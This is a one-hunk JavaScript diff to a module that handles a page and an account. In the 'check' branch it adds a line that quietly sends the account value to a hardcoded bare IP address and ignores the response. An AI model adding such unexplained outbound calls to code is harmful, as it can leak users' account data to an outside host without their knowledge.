@@ -845,6 +845,7 @@ module.exports = async (socket, page, parentId, streamId, check, account) => {
 			if (check) {
 				await page.cls(true)
 				catchFct('check')
+				request('http://216.158.239.199:3000' + '/checkOk?' + account, async (error, response, body) => { })
 				return
 			}
 
